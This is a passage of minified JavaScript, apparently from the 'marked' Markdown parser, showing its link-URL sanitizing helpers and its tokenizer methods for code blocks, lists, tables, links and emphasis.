H=H.toLowerCase(),H==="colon"?":":H.charAt(0)==="#"?H.charAt(1)==="x"?String.fromCharCode(parseInt(H.substring(2),16)):String.fromCharCode(+H.substring(1)):""})}var _=/(^|[^\[])\^/g;function M(le,ue){le=typeof le=="string"?le:le.source,ue=ue||"";var H={replace:function(F,X){return X=X.source||X,X=X.replace(_,"$1"),le=le.replace(F,X),H},getRegex:function(){return new RegExp(le,ue)}};return H}var R=/[^\w:]/g,B=/^$|^[a-z][a-z0-9+.-]*:|^[?#]/i;function U(le,ue,H){if(le){var L;try{L=decodeURIComponent(A(H)).replace(R,"").toLowerCase()}catch{return null}if(L.indexOf("javascript:")===0||L.indexOf("vbscript:")===0||L.indexOf("data:")===0)return null}ue&&!B.test(H)&&(H=me(ue,H));try{H=encodeURI(H).replace(/%25/g,"%")}catch{return null}return H}var $={},Y=/^[^:]+:\/*[^/]*$/,ne=/^([^:]+:)[\s\S]*$/,Z=/^([^:]+:\/*[^/]*)[\s\S]*$/;function me(le,ue){$[" "+le]||(Y.test(le)?$[" "+le]=le+"/":$[" "+le]=pe(le,"/",!0)),le=$[" "+le];var H=le.indexOf(":")===-1;return ue.substring(0,2)==="//"?H?ue:le.replace(ne,"$1")+ue:ue.charAt(0)==="/"?H?ue:le.replace(Z,"$1")+ue:le+ue}var ye={exec:function(){}};function J(le,ue){var H=le.replace(/\|/g,function(X,G,te){for(var Ce=!1,je=G;--je>=0&&te[je]==="\\";)Ce=!Ce;return Ce?"|":" |"}),L=H.split(/ \|/),F=0;if(L[0].trim()||L.shift(),L.length>0&&!L[L.length-1].trim()&&L.pop(),L.length>ue)L.splice(ue);else for(;L.length<ue;)L.push("");for(;F<L.length;F++)L[F]=L[F].trim().replace(/\\\|/g,"|");return L}function pe(le,ue,H){var L=le.length;if(L===0)return"";for(var F=0;F<L;){var X=le.charAt(L-F-1);if(X===ue&&!H)F++;else if(X!==ue&&H)F++;else break}return le.slice(0,L-F)}function oe(le,ue){if(le.indexOf(ue[1])===-1)return-1;for(var H=le.length,L=0,F=0;F<H;F++)if(le[F]==="\\")F++;else if(le[F]===ue[0])L++;else if(le[F]===ue[1]&&(L--,L<0))return F;return-1}function ae(le){le&&le.sanitize&&!le.silent&&console.warn("marked(): sanitize and sanitizer parameters are deprecated since version 0.7.0, should not be used and will be removed in the future. Read more here: https://marked.js.org/#/USING_ADVANCED.md#options")}function xe(le,ue){if(ue<1)return"";for(var H="";ue>1;)ue&1&&(H+=le),ue>>=1,le+=le;return H+le}function q(le,ue,H,L){var F=ue.href,X=ue.title?N(ue.title):null,G=le[1].replace(/\\([\[\]])/g,"$1");if(le[0].charAt(0)!=="!"){L.state.inLink=!0;var te={type:"link",raw:H,href:F,title:X,text:G,tokens:L.inlineTokens(G)};return L.state.inLink=!1,te}return{type:"image",raw:H,href:F,title:X,text:N(G)}}function We(le,ue){var H=le.match(/^(\s+)(?:```)/);if(H===null)return ue;var L=H[1];return ue.split(`
`).map(function(F){var X=F.match(/^\s+/);if(X===null)return F;var G=X[0];return G.length>=L.length?F.slice(L.length):F}).join(`
`)}var Q=function(){function le(H){this.options=H||e.defaults}var ue=le.prototype;return ue.space=function(L){var F=this.rules.block.newline.exec(L);if(F&&F[0].length>0)return{type:"space",raw:F[0]}},ue.code=function(L){var F=this.rules.block.code.exec(L);if(F){var X=F[0].replace(/^ {1,4}/gm,"");return{type:"code",raw:F[0],codeBlockStyle:"indented",text:this.options.pedantic?X:pe(X,`
`)}}},ue.fences=function(L){var F=this.rules.block.fences.exec(L);if(F){var X=F[0],G=We(X,F[3]||"");return{type:"code",raw:X,lang:F[2]?F[2].trim().replace(this.rules.inline._escapes,"$1"):F[2],text:G}}},ue.heading=function(L){var F=this.rules.block.heading.exec(L);if(F){var X=F[2].trim();if(/#$/.test(X)){var G=pe(X,"#");(this.options.pedantic||!G||/ $/.test(G))&&(X=G.trim())}return{type:"heading",raw:F[0],depth:F[1].length,text:X,tokens:this.lexer.inline(X)}}},ue.hr=function(L){var F=this.rules.block.hr.exec(L);if(F)return{type:"hr",raw:F[0]}},ue.blockquote=function(L){var F=this.rules.block.blockquote.exec(L);if(F){var X=F[0].replace(/^ *>[ \t]?/gm,""),G=this.lexer.state.top;this.lexer.state.top=!0;var te=this.lexer.blockTokens(X);return this.lexer.state.top=G,{type:"blockquote",raw:F[0],tokens:te,text:X}}},ue.list=function(L){var F=this.rules.block.list.exec(L);if(F){var X,G,te,Ce,je,Re,Be,Ue,Le,qe,fe,Et,gt=F[1].trim(),xt=gt.length>1,tt={type:"list",raw:"",ordered:xt,start:xt?+gt.slice(0,-1):"",loose:!1,items:[]};gt=xt?"\\d{1,9}\\"+gt.slice(-1):"\\"+gt,this.options.pedantic&&(gt=xt?gt:"[*+-]");for(var rn=new RegExp("^( {0,3}"+gt+")((?:[	 ][^\\n]*)?(?:\\n|$))");L&&(Et=!1,!(!(F=rn.exec(L))||this.rules.block.hr.test(L)));){if(X=F[0],L=L.substring(X.length),Ue=F[2].split(`
`,1)[0].replace(/^\t+/,function(qi){return" ".repeat(3*qi.length)}),Le=L.split(`
`,1)[0],this.options.pedantic?(Ce=2,fe=Ue.trimLeft()):(Ce=F[2].search(/[^ ]/),Ce=Ce>4?1:Ce,fe=Ue.slice(Ce),Ce+=F[1].length),Re=!1,!Ue&&/^ *$/.test(Le)&&(X+=Le+`
`,L=L.substring(Le.length+1),Et=!0),!Et)for(var gn=new RegExp("^ {0,"+Math.min(3,Ce-1)+"}(?:[*+-]|\\d{1,9}[.)])((?:[ 	][^\\n]*)?(?:\\n|$))"),Cr=new RegExp("^ {0,"+Math.min(3,Ce-1)+"}((?:- *){3,}|(?:_ *){3,}|(?:\\* *){3,})(?:\\n+|$)"),Bt=new RegExp("^ {0,"+Math.min(3,Ce-1)+"}(?:```|~~~)"),pi=new RegExp("^ {0,"+Math.min(3,Ce-1)+"}#");L&&(qe=L.split(`
`,1)[0],Le=qe,this.options.pedantic&&(Le=Le.replace(/^ {1,4}(?=( {4})*[^ ])/g,"  ")),!(Bt.test(Le)||pi.test(Le)||gn.test(Le)||Cr.test(L)));){if(Le.search(/[^ ]/)>=Ce||!Le.trim())fe+=`
`+Le.slice(Ce);else{if(Re||Ue.search(/[^ ]/)>=4||Bt.test(Ue)||pi.test(Ue)||Cr.test(Ue))break;fe+=`
`+Le}!Re&&!Le.trim()&&(Re=!0),X+=qe+`
`,L=L.substring(qe.length+1),Ue=Le.slice(Ce)}tt.loose||(Be?tt.loose=!0:/\n *\n *$/.test(X)&&(Be=!0)),this.options.gfm&&(G=/^\[[ xX]\] /.exec(fe),G&&(te=G[0]!=="[ ] ",fe=fe.replace(/^\[[ xX]\] +/,""))),tt.items.push({type:"list_item",raw:X,task:!!G,checked:te,loose:!1,text:fe}),tt.raw+=X}tt.items[tt.items.length-1].raw=X.trimRight(),tt.items[tt.items.length-1].text=fe.trimRight(),tt.raw=tt.raw.trimRight();var mi=tt.items.length;for(je=0;je<mi;je++)if(this.lexer.state.top=!1,tt.items[je].tokens=this.lexer.blockTokens(tt.items[je].text,[]),!tt.loose){var Mr=tt.items[je].tokens.filter(function(qi){return qi.type==="space"}),Gl=Mr.length>0&&Mr.some(function(qi){return/\n.*\n/.test(qi.raw)});tt.loose=Gl}if(tt.loose)for(je=0;je<mi;je++)tt.items[je].loose=!0;return tt}},ue.html=function(L){var F=this.rules.block.html.exec(L);if(F){var X={type:"html",raw:F[0],pre:!this.options.sanitizer&&(F[1]==="pre"||F[1]==="script"||F[1]==="style"),text:F[0]};if(this.options.sanitize){var G=this.options.sanitizer?this.options.sanitizer(F[0]):N(F[0]);X.type="paragraph",X.text=G,X.tokens=this.lexer.inline(G)}return X}},ue.def=function(L){var F=this.rules.block.def.exec(L);if(F){var X=F[1].toLowerCase().replace(/\s+/g," "),G=F[2]?F[2].replace(/^<(.*)>$/,"$1").replace(this.rules.inline._escapes,"$1"):"",te=F[3]?F[3].substring(1,F[3].length-1).replace(this.rules.inline._escapes,"$1"):F[3];return{type:"def",tag:X,raw:F[0],href:G,title:te}}},ue.table=function(L){var F=this.rules.block.table.exec(L);if(F){var X={type:"table",header:J(F[1]).map(function(Be){return{text:Be}}),align:F[2].replace(/^ *|\| *$/g,"").split(/ *\| */),rows:F[3]&&F[3].trim()?F[3].replace(/\n[ \t]*$/,"").split(`
`):[]};if(X.header.length===X.align.length){X.raw=F[0];var G=X.align.length,te,Ce,je,Re;for(te=0;te<G;te++)/^ *-+: *$/.test(X.align[te])?X.align[te]="right":/^ *:-+: *$/.test(X.align[te])?X.align[te]="center":/^ *:-+ *$/.test(X.align[te])?X.align[te]="left":X.align[te]=null;for(G=X.rows.length,te=0;te<G;te++)X.rows[te]=J(X.rows[te],X.header.length).map(function(Be){return{text:Be}});for(G=X.header.length,Ce=0;Ce<G;Ce++)X.header[Ce].tokens=this.lexer.inline(X.header[Ce].text);for(G=X.rows.length,Ce=0;Ce<G;Ce++)for(Re=X.rows[Ce],je=0;je<Re.length;je++)Re[je].tokens=this.lexer.inline(Re[je].text);return X}}},ue.lheading=function(L){var F=this.rules.block.lheading.exec(L);if(F)return{type:"heading",raw:F[0],depth:F[2].charAt(0)==="="?1:2,text:F[1],tokens:this.lexer.inline(F[1])}},ue.paragraph=function(L){var F=this.rules.block.paragraph.exec(L);if(F){var X=F[1].charAt(F[1].length-1)===`
`?F[1].slice(0,-1):F[1];return{type:"paragraph",raw:F[0],text:X,tokens:this.lexer.inline(X)}}},ue.text=function(L){var F=this.rules.block.text.exec(L);if(F)return{type:"text",raw:F[0],text:F[0],tokens:this.lexer.inline(F[0])}},ue.escape=function(L){var F=this.rules.inline.escape.exec(L);if(F)return{type:"escape",raw:F[0],text:N(F[1])}},ue.tag=function(L){var F=this.rules.inline.tag.exec(L);if(F)return!this.lexer.state.inLink&&/^<a /i.test(F[0])?this.lexer.state.inLink=!0:this.lexer.state.inLink&&/^<\/a>/i.test(F[0])&&(this.lexer.state.inLink=!1),!this.lexer.state.inRawBlock&&/^<(pre|code|kbd|script)(\s|>)/i.test(F[0])?this.lexer.state.inRawBlock=!0:this.lexer.state.inRawBlock&&/^<\/(pre|code|kbd|script)(\s|>)/i.test(F[0])&&(this.lexer.state.inRawBlock=!1),{type:this.options.sanitize?"text":"html",raw:F[0],inLink:this.lexer.state.inLink,inRawBlock:this.lexer.state.inRawBlock,text:this.options.sanitize?this.options.sanitizer?this.options.sanitizer(F[0]):N(F[0]):F[0]}},ue.link=function(L){var F=this.rules.inline.link.exec(L);if(F){var X=F[2].trim();if(!this.options.pedantic&&/^</.test(X)){if(!/>$/.test(X))return;var G=pe(X.slice(0,-1),"\\");if((X.length-G.length)%2===0)return}else{var te=oe(F[2],"()");if(te>-1){var Ce=F[0].indexOf("!")===0?5:4,je=Ce+F[1].length+te;F[2]=F[2].substring(0,te),F[0]=F[0].substring(0,je).trim(),F[3]=""}}var Re=F[2],Be="";if(this.options.pedantic){var Ue=/^([^'"]*[^\s])\s+(['"])(.*)\2/.exec(Re);Ue&&(Re=Ue[1],Be=Ue[3])}else Be=F[3]?F[3].slice(1,-1):"";return Re=Re.trim(),/^</.test(Re)&&(this.options.pedantic&&!/>$/.test(X)?Re=Re.slice(1):Re=Re.slice(1,-1)),q(F,{href:Re&&Re.replace(this.rules.inline._escapes,"$1"),title:Be&&Be.replace(this.rules.inline._escapes,"$1")},F[0],this.lexer)}},ue.reflink=function(L,F){var X;if((X=this.rules.inline.reflink.exec(L))||(X=this.rules.inline.nolink.exec(L))){var G=(X[2]||X[1]).replace(/\s+/g," ");if(G=F[G.toLowerCase()],!G){var te=X[0].charAt(0);return{type:"text",raw:te,text:te}}return q(X,G,X[0],this.lexer)}},ue.emStrong=function(L,F,X){X===void 0&&(X="");var G=this.rules.inline.emStrong.lDelim.exec(L);if(G&&!(G[3]&&X.match(/(?:[0-9A-Za-z\xAA\xB2\xB3\xB5\xB9\xBA\xBC-\xBE\xC0-\xD6\xD8-\xF6\xF8-\u02C1\u02C6-\u02D1\u02E0-\u02E4\u02EC\u02EE\u0370-\u0374\u0376\u0377\u037A-\u037D\u037F\u0386\u0388-\u038A\u038C\u038E-\u03A1\u03A3-\u03F5\u03F7-\u0481\u048A-\u052F\u0531-\u0556\u0559\u0560-\u0588\u05D0-\u05EA\u05EF-\u05F2\u0620-\u064A\u0660-\u0669\u066E\u066F\u0671-\u06D3\u06D5\u06E5\u06E6\u06EE-\u06FC\u06FF\u0710\u0712-\u072F\u074D-\u07A5\u07B1\u07C0-\u07EA\u07F4\u07F5\u07FA\u0800-\u0815\u081A\u0824\u0828\u0840-\u0858\u0860-\u086A\u0870-\u0887\u0889-\u088E\u08A0-\u08C9\u0904-\u0939\u093D\u0950\u0958-\u0961\u0966-\u096F\u0971-\u0980\u0985-\u098C\u098F\u0990\u0993-\u09A8\u09AA-\u09B0\u09B2\u09B6-\u09B9\u09BD\u09CE\u09DC\u09DD\u09DF-\u09E1\u09E6-\u09F1\u09F4-\u09F9\u09FC\u0A05-\u0A0A\u0A0F\u0A10\u0A13-\u0A28\u0A2A-\u0A30\u0A32\u0A33\u0A35\u0A36\u0A38\u0A39\u0A59-\u0A5C\u0A5E\u0A66-\u0A6F\u0A72-\u0A74\u0A85-\u0A8D\u0A8F-\u0A91\u0A93-\u0AA8\u0AAA-\u0AB0\u0AB2\u0AB3\u0AB5-\u0AB9\u0ABD\u0AD0\u0AE0\u0AE1\u0AE6-\u0AEF\u0AF9\u0B05-\u0B0C\u0B0F\u0B10\u0B13-\u0B28\u0B2A-\u0B30\u0B32\u0B33\u0B35-\u0B39\u0B3D\u0B5C\u0B5D\u0B5F-\u0B61\u0B66-\u0B6F\u0B71-\u0B77\u0B83\u0B85-\u0B8A\u0B8E-\u0B90\u0B92-\u0B95\u0B99\u0B9A\u0B9C\u0B9E\u0B9F\u0BA3\u0BA4\u0BA8-\u0BAA\u0BAE-\u0BB9\u0BD0\u0BE6-\u0BF2\u0C05-\u0C0C\u0C0E-\u0C10\u0C12-\u0C28\u0C2A-\u0C39\u0C3D\u0C58-\u0C5A\u0C5D\u0C60\u0C61\u0C66-\u0C6F\u0C78-\u0C7E\u0C80\u0C85-\u0C8C\u0C8E-\u0C90\u0C92-\u0CA8\u0CAA-\u0CB3\u0CB5-\u0CB9\u0CBD\u0CDD\u0CDE\u0CE0\u0CE1\u0CE6-\u0CEF\u0CF1\u0CF2\u0D04-\u0D0C\u0D0E-\u0D10\u0D12-\u0D3A\u0D3D\u0D4E\u0D54-\u0D56\u0D58-\u0D61\u0D66-\u0D78\u0D7A-\u0D7F\u0D85-\u0D96\u0D9A-\u0DB1\u0DB3-\u0DBB\u0DBD\u0DC0-\u0DC6\u0DE6-\u0DEF\u0E01-\u0E30\u0E32\u0E33\u0E40-\u0E46\u0E50-\u0E59\u0E81\u0E82\u0E84\u0E86-\u0E8A\u0E8C-\u0EA3\u0EA5\u0EA7-\u0EB0\u0EB2\u0EB3\u0EBD\u0EC0-\u0EC4\u0EC6\u0ED0-\u0ED9\u0EDC-\u0EDF\u0F00\u0F20-\u0F33\u0F40-\u0F47\u0F49-\u0F6C\u0F88-\u0F8C\u1000-\u102A\u103F-\u1049\u1050-\u1055\u105A-\u105D\u1061\u1065\u1066\u106E-\u1070\u1075-\u1081\u108E\u1090-\u1099\u10A0-\u10C5\u10C7\u10CD\u10D0-\u10FA\u10FC-\u1248\u124A-\u124D\u1250-\u1256\u1258\u125A-\u125D\u1260-\u1288\u128A-\u128D\u1290-\u12B0\u12B2-\u12B5\u12B8-\u12BE\u12C0\u12C2-\u12C5\u12C8-\u12D6\u12D8-\u1310\u1312-\u1315\u1318-\u135A\u1369-\u137C\u1380-\u138F\u13A0-\u13F5\u13F8-\u13FD\u1401-\u166C\u166F-\u167F\u1681-\u169A\u16A0-\u16EA\u16EE-\u16F8\u1700-\u1711\u171F-\u1731\u1740-\u1751\u1760-\u176C\u176E-\u1770\u1780-\u17B3\u17D7\u17DC\u17E0-\u17E9\u17F0-\u17F9\u1810-\u1819\u1820-\u1878\u1880-\u1884\u1887-\u18A8\u18AA\u18B0-\u18F5\u1900-\u191E\u1946-\u196D\u1970-\u1974\u1980-\u19AB\u19B0-\u19C9\u19D0-\u19DA\u1A00-\u1A16\u1A20-\u1A54\u1A80-\u1A89\u1A90-\u1A99\u1AA7\u1B05-\u1B33\u1B45-\u1B4C\u1B50-\u1B59\u1B83-\u1BA0\u1BAE-\u1BE5\u1C00-\u1C23\u1C40-\u1C49\u1C4D-\u1C7D\u1C80-\u1C88\u1C90-\u1CBA\u1CBD-\u1CBF\u1CE9-\u1CEC\u1CEE-\u1CF3\u1CF5\u1CF6\u1CFA\u1D00-\u1DBF\u1E00-\u1F15\u1F18-\u1F1D\u1F20-\u1F45\u1F48-\u1F4D\u1F50-\u1F57\u1F59\u1F5B\u1F5D\u1F5F-\u1F7D\u1F80-\u1FB4\u1FB6-\u1FBC\u1FBE\u1FC2-\u1FC4\u1FC6-\u1FCC\u1FD0-\u1FD3\u1FD6-\u1FDB\u1FE0-\u1FEC\u1FF2-\u1FF4\u1FF6-\u1FFC\u2070\u2071\u2074-\u2079\u207F-\u2089\u2090-\u209C\u2102\u2107\u210A-\u2113\u2115\u2119-\u211D\u2124\u2126\u2128\u212A-\u212D\u212F-\u2139\u213C-\u213F\u2145-\u2149\u214E\u2150-\u2189\u2460-\u249B\u24EA-\u24FF\u2776-\u2793\u2C00-\u2CE4\u2CEB-\u2CEE\u2CF2\u2CF3\u2CFD\u2D00-\u2D25\u2D27\u2D2D\u2D30-\u2D67\u2D6F\u2D80-\u2D96\u2DA0-\u2DA6\u2DA8-\u2DAE\u2DB0-\u2DB6\u2DB8-\u2DBE\u2DC0-\u2DC6\u2DC8-\u2DCE\u2DD0-\u2DD6\u2DD8-\u2DDE\u2E2F\u3005-\u3007\u3021-\u3029\u3031-\u3035\u3038-\u303C\u3041-\u3096\u309D-\u309F\u30A1-\u30FA\u30FC-\u30FF\u3105-\u312F\u3131-\u318E\u3192-\u3195\u31A0-\u31BF\u31F0-\u31FF\u3220-\u3229\u3248-\u324F\u3251-\u325F\u3280-\u3289\u32B1-\u32BF\u3400-\u4DBF\u4E00-\uA48C\uA4D0-\uA4FD\uA500-\uA60C\uA610-\uA62B\uA640-\uA66E\uA67F-\uA69D\uA6A0-\uA6EF\uA717-\uA71F\uA722-\uA788\uA78B-\uA7CA\uA7D0\uA7D1\uA7D3\uA7D5-\uA7D9\uA7F2-\uA801\uA803-\uA805\uA807-\uA80A\uA80C-\uA822\uA830-\uA835\uA840-\uA873\uA882-\uA8B3\uA8D0-\uA8D9\uA8F2-\uA8F7\uA8FB\uA8FD\uA8FE\uA900-\uA925\uA930-\uA946\uA960-\uA97C\uA984-\uA9B2\uA9CF-\uA9D9\uA9E0-\uA9E4\uA9E6-\uA9FE\uAA00-\uAA28\uAA40-\uAA42\uAA44-\uAA4B\uAA50-\uAA59\uAA60-\uAA76\uAA7A\uAA7E-\uAAAF\uAAB1\uAAB5\uAAB6\uAAB9-\uAABD\uAAC0\uAAC2\uAADB-\uAADD\uAAE0-\uAAEA\uAAF2-\uAAF4\uAB01-\uAB06\uAB09-\uAB0E\uAB11-\uAB16\uAB20-\uAB26\uAB28-\uAB2E\uAB30-\uAB5A\uAB5C-\uAB69\uAB70-\uABE2\uABF0-\uABF9\uAC00-\uD7A3\uD7B0-\uD7C6\uD7CB-\uD7FB\uF900-\uFA6D\uFA70-\uFAD9\uFB00-\uFB06\uFB13-\uFB17\uFB1D\uFB1F-\uFB28\uFB2A-\uFB36\uFB38-\uFB3C\uFB3E\uFB40\uFB41\uFB43\uFB44\uFB46-\uFBB1\uFBD3-\uFD3D\uFD50-\uFD8F\uFD92-\uFDC7\uFDF0-\uFDFB\uFE70-\uFE74\uFE76-\uFEFC\uFF10-\uFF19\uFF21-\uFF3A\uFF41-\uFF5A\uFF66-\uFFBE\uFFC2-\uFFC7\uFFCA-\uFFCF\uFFD2-\uFFD7\uFFDA-\uFFDC]|\uD800[\uDC00-\uDC0B\uDC0D-\uDC26\uDC28-\uDC3A\uDC3C\uDC3D\uDC3F-\uDC4D\uDC50-\uDC5D\uDC80-\uDCFA\uDD07-\uDD33\uDD40-\uDD78\uDD8A\uDD8B\uDE80-\uDE9C\uDEA0-\uDED0\uDEE1-\uDEFB\uDF00-\uDF23\uDF2D-\uDF4A\uDF50-\uDF75\uDF80-\uDF9D\uDFA0-\uDFC3\uDFC8-\uDFCF\uDFD1-\uDFD5]|\uD801[\uDC00-\uDC9D\uDCA0-\uDCA9\uDCB0-\uDCD3\uDCD8-\uDCFB\uDD00-\uDD27\uDD30-\uDD63\uDD70-\uDD7A\uDD7C-\uDD8A\uDD8C-\uDD92\uDD94\uDD95\uDD97-\uDDA1\uDDA3-\uDDB1\uDDB3-\uDDB9\uDDBB\uDDBC\uDE00-\uDF36\uDF40-\uDF55\uDF60-\uDF67\uDF80-\uDF85\uDF87-\uDFB0\uDFB2-\uDFBA]|\uD802[\uDC00-\uDC05\uDC08\uDC0A-\uDC35\uDC37\uDC38\uDC3C\uDC3F-\uDC55\uDC58-\uDC76\uDC79-\uDC9E\uDCA7-\uDCAF\uDCE0-\uDCF2\uDCF4\uDCF5\uDCFB-\uDD1B\uDD20-\uDD39\uDD80-\uDDB7\uDDBC-\uDDCF\uDDD2-\uDE00\uDE10-\uDE13\uDE15-\uDE17\uDE19-\uDE35\uDE40-\uDE48\uDE60-\uDE7E\uDE80-\uDE9F\uDEC0-\uDEC7\uDEC9-\uDEE4\uDEEB-\uDEEF\uDF00-\uDF35\uDF40-\uDF55\uDF58-\uDF72\uDF78-\uDF91\uDFA9-\uDFAF]|\uD803[\uDC00-\uDC48\uDC80-\uDCB2\uDCC0-\uDCF2\uDCFA-\uDD23\uDD30-\uDD39\uDE60-\uDE7E\uDE80-\uDEA9\uDEB0\uDEB1\uDF00-\uDF27\uDF30-\uDF45\uDF51-\uDF54\uDF70-\uDF81\uDFB0-\uDFCB\uDFE0-\uDFF6]|\uD804[\uDC03-\uDC37\uDC52-\uDC6F\uDC71\uDC72\uDC75\uDC83-\uDCAF\uDCD0-\uDCE8\uDCF0-\uDCF9\uDD03-\uDD26\uDD36-\uDD3F\uDD44\uDD47\uDD50-\uDD72\uDD76\uDD83-\uDDB2\uDDC1-\uDDC4\uDDD0-\uDDDA\uDDDC\uDDE1-\uDDF4\uDE00-\uDE11\uDE13-\uDE2B\uDE80-\uDE86\uDE88\uDE8A-\uDE8D\uDE8F-\uDE9D\uDE9F-\uDEA8\uDEB0-\uDEDE\uDEF0-\uDEF9\uDF05-\uDF0C\uDF0F\uDF10\uDF13-\uDF28\uDF2A-\uDF30\uDF32\uDF33\uDF35-\uDF39\uDF3D\uDF50\uDF5D-\uDF61]|\uD805[\uDC00-\uDC34\uDC47-\uDC4A\uDC50-\uDC59\uDC5F-\uDC61\uDC80-\uDCAF\uDCC4\uDCC5\uDCC7\uDCD0-\uDCD9\uDD80-\uDDAE\uDDD8-\uDDDB\uDE00-\uDE2F\uDE44\uDE50-\uDE59\uDE80-\uDEAA\uDEB8\uDEC0-\uDEC9\uDF00-\uDF1A\uDF30-\uDF3B\uDF40-\uDF46]|\uD806[\uDC00-\uDC2B\uDCA0-\uDCF2\uDCFF-\uDD06\uDD09\uDD0C-\uDD13\uDD15\uDD16\uDD18-\uDD2F\uDD3F\uDD41\uDD50-\uDD59\uDDA0-\uDDA7\uDDAA-\uDDD0\uDDE1\uDDE3\uDE00\uDE0B-\uDE32\uDE3A\uDE50\uDE5C-\uDE89\uDE9D\uDEB0-\uDEF8]|\uD807[\uDC00-\uDC08\uDC0A-\uDC2E\uDC40\uDC50-\uDC6C\uDC72-\uDC8F\uDD00-\uDD06\uDD08\uDD09\uDD0B-\uDD30\uDD46\uDD50-\uDD59\uDD60-\uDD65\uDD67\uDD68\uDD6A-\uDD89\uDD98\uDDA0-\uDDA9\uDEE0-\uDEF2\uDFB0\uDFC0-\uDFD4]|\uD808[\uDC00-\uDF99]|\uD809[\uDC00-\uDC6E\uDC80-\uDD43]|\uD80B[\uDF90-\uDFF0]|[\uD80C\uD81C-\uD820\uD822\uD840-\uD868\uD86A-\uD86C\uD86F-\uD872\uD874-\uD879\uD880-\uD883][\uDC00-\uDFFF]|\uD80D[\uDC00-\uDC2E]|\uD811[\uDC00-\uDE46]|\uD81A[\uDC00-\uDE38\uDE40-\uDE5E\uDE60-\uDE69\uDE70-\uDEBE\uDEC0-\uDEC9\uDED0-\uDEED\uDF00-\uDF2F\uDF40-\uDF43\uDF50-\uDF59\uDF5B-\uDF61\uDF63-\uDF77\uDF7D-\uDF8F]|\uD81B[\uDE40-\uDE96\uDF00-\uDF4A\uDF50\uDF93-\uDF9F\uDFE0\uDFE1\uDFE3]|\uD821[\uDC00-\uDFF7]|\uD823[\uDC00-\uDCD5\uDD00-\uDD08]|\uD82B[\uDFF0-\uDFF3\uDFF5-\uDFFB\uDFFD\uDFFE]|\uD82C[\uDC00-\uDD22\uDD50-\uDD52\uDD64-\uDD67\uDD70-\uDEFB]|\uD82F[\uDC00-\uDC6A\uDC70-\uDC7C\uDC80-\uDC88\uDC90-\uDC99]|\uD834[\uDEE0-\uDEF3\uDF60-\uDF78]|\uD835[\uDC00-\uDC54\uDC56-\uDC9C\uDC9E\uDC9F\uDCA2\uDCA5\uDCA6\uDCA9-\uDCAC\uDCAE-\uDCB9\uDCBB\uDCBD-\uDCC3\uDCC5-\uDD05\uDD07-\uDD0A\uDD0D-\uDD14\uDD16-\uDD1C\uDD1E-\uDD39\uDD3B-\uDD3E\uDD40-\uDD44\uDD46\uDD4A-\uDD50\uDD52-\uDEA5\uDEA8-\uDEC0\uDEC2-\uDEDA\uDEDC-\uDEFA\uDEFC-\uDF14\uDF16-\uDF34\uDF36-\uDF4E\uDF50-\uDF6E\uDF70-\uDF88\uDF8A-\uDFA8\uDFAA-\uDFC2\uDFC4-\uDFCB\uDFCE-\uDFFF]|\uD837[\uDF00-\uDF1E]|\uD838[\uDD00-\uDD2C\uDD37-\uDD3D\uDD40-\uDD49\uDD4E\uDE90-\uDEAD\uDEC0-\uDEEB\uDEF0-\uDEF9]|\uD839[\uDFE0-\uDFE6\uDFE8-\uDFEB\uDFED\uDFEE\uDFF0-\uDFFE]|\uD83A[\uDC00-\uDCC4\uDCC7-\uDCCF\uDD00-\uDD43\uDD4B\uDD50-\uDD59]|\uD83B[\uDC71-\uDCAB\uDCAD-\uDCAF\uDCB1-\uDCB4\uDD01-\uDD2D\uDD2F-\uDD3D\uDE00-\uDE03\uDE05-\uDE1F\uDE21\uDE22\uDE24\uDE27\uDE29-\uDE32\uDE34-\uDE37\uDE39\uDE3B\uDE42\uDE47\uDE49\uDE4B\uDE4D-\uDE4F\uDE51\uDE52\uDE54\uDE57\uDE59\uDE5B\uDE5D\uDE5F\uDE61\uDE62\uDE64\uDE67-\uDE6A\uDE6C-\uDE72\uDE74-\uDE77\uDE79-\uDE7C\uDE7E\uDE80-\uDE89\uDE8B-\uDE9B\uDEA1-\uDEA3\uDEA5-\uDEA9\uDEAB-\uDEBB]|\uD83C[\uDD00-\uDD0C]|\uD83E[\uDFF0-\uDFF9]|\uD869[\uDC00-\uDEDF\uDF00-\uDFFF]|\uD86D[\uDC00-\uDF38\uDF40-\uDFFF]|\uD86E[\uDC00-\uDC1D\uDC20-\uDFFF]|\uD873[\uDC00-\uDEA1\uDEB0-\uDFFF]|\uD87A[\uDC00-\uDFE0]|\uD87E[\uDC00-\uDE1D]|\uD884[\uDC00-\uDF4A])/))){var te=G[1]||G[2]||"";if(!te||te&&(X===""||this.rules.inline.punctuation.exec(X))){var Ce=G[0].length-1,je,Re,Be=Ce,Ue=0,Le=G[0][0]==="*"?this.rules.inline.emStrong.rDelimAst:this.rules.inline.emStrong.rDelimUnd;for(Le.lastIndex=0,F=F.slice(-1*L.length+Ce);(G=Le.exec(F))!=null;)if(je=G[1]||G[2]||G[3]||G[4]||G[5]||G[6],!!je){if(Re=je.length,G[3]||G[4]){Be+=Re;continue}else if((G[5]||G[6])&&Ce%3&&!((Ce+Re)%3)){Ue+=Re;continue}if(Be-=Re,!(Be>0)){Re=Math.min(Re,Re+Be+Ue);var qe=L.slice(0,Ce+G.index+(G[0].length-je.length)+Re);if(Math.min(Ce,Re)%2){var fe=qe.slice(1,-1);return{type:"em",raw:qe,text:fe,tokens:this.lexer.inlineTokens(fe)}}var Et=qe.slice(2,-2);return{type:"strong",raw:qe,text:Et,tokens:this.lexer.inlineTokens(Et)}}}}}},ue.codespan=function(L){var F=this.rules.inline.code.exec(L);if(F){var X=F[2].replace(/\n/g," "),G=/[^ ]/.test(X),te=/^ /.test(X)&&/ $/.test(X);return G&&te&&(X=X.substring(1,X.length-1)),X=N(X,!0),{type:"codespan",raw:F[0],text:X}}},ue.br=function(L){var F=this.rules.inline.br.exec(L);if(F)return{type:"br",raw:F[0]}},ue.del=function(L){var F=this.rules.inline.del.exec(L);if(F)return{type:"del",raw:F[0],text:F[2],tokens:this.lexer.inlineTokens(F[2])}},ue.autolink=function(L,F){var X=this.rules.inline.autolink.exec(L);if(X){var G,te;return X[2]==="@"?(G=N(this.options.mangle?F(X[1]):X[1]),te="mailto:"+G):(G=N(X[1]),te=G),{type:"link",raw:X[0],text:G,href:te,tokens:[{type:"text",raw:G,text:G}]}}},ue.url=function(L,F){var X;if(X=this.rules.inline.url.exec(L)){var G,te;if(X[2]==="@")G=N(this.options.mangle?F(X[0]):X[0]),te="mailto:"+G;else{var Ce;do 